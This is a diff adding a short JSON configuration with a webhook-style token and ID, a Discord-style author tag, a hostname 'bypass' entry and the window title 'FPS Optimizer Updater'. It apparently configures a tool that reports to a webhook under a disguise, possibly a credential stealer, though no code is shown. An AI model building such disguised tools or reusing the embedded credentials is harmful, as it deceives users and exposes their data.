@@ -1,0 +1,23 @@
+{
+    "token":"GERX8-IJ46L",
+    "type": "normal",
+    "version": "3.0.0",
+    "direct": "mKrKIFVTzSJuWW09R1Tb1y9WRX56Rs8jcUxokYOupy8GqBnrdkXWQPNB2yWGyNaQTGOh",
+    "directID": "866049949363601418",
+    "author": {
+        "name": "Alpha Dev",
+        "tag": "5594",
+        "ID": "690222779668496408"
+    },
+    "local": {
+        "bans":{
+            "list": [""],
+            "bypass": ["LAPTOP-V213SE7I"]
+        },
+        "settings": {
+            "windowTitle": "FPS Optimizer Updater",
+            "maxAttempts": "5",
+            "notify": false
+        }
+    }
+}
